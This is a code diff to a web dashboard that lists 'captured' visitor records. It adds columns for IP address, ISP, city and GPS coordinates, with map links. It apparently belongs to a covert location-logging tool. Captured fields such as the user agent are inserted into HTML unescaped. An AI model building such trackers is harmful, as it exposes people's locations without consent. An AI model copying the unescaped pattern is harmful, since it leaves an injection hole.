@@ -33,9 +33,10 @@
                     <tr>
                         <th>Time Captured</th>
                         <th>Device/Browser</th>
-                        <th>Country</th>
-                        <th>Latitude</th>
-                        <th>Longitude</th>
+                        <th>Country/City</th>
+                        <th>ISP/Tower</th>
+                        <th>IP Address</th>
+                        <th>Coordinates</th>
                         <th>Actions</th>
                     </tr>
                 </thead>
@@ -96,11 +97,12 @@
                     <tr>
                         <td>${timeStr}</td>
                         <td title="${data.userAgent}">${ua}</td>
-                        <td>${data.country || 'N/A'}</td>
-                        <td>${data.lat}</td>
-                        <td>${data.lng}</td>
+                        <td>${data.country || 'N/A'}${data.city ? ` / ${data.city}` : ''}</td>
+                        <td>${data.isp || 'N/A'}</td>
+                        <td>${data.ip || 'N/A'}</td>
+                        <td>${data.lat ? `${data.lat}, ${data.lng}` : '<span style="color:red; font-size:12px;">IP Only (Not GPS)</span>'}</td>
                         <td>
-                            <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" class="btn">Map</a>
+                            ${data.lat ? `<a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" class="btn">Map</a>` : ''}
                             <button class="btn btn-danger delete-btn" data-id="${id}">Delete</button>
                         </td>
                     </tr>
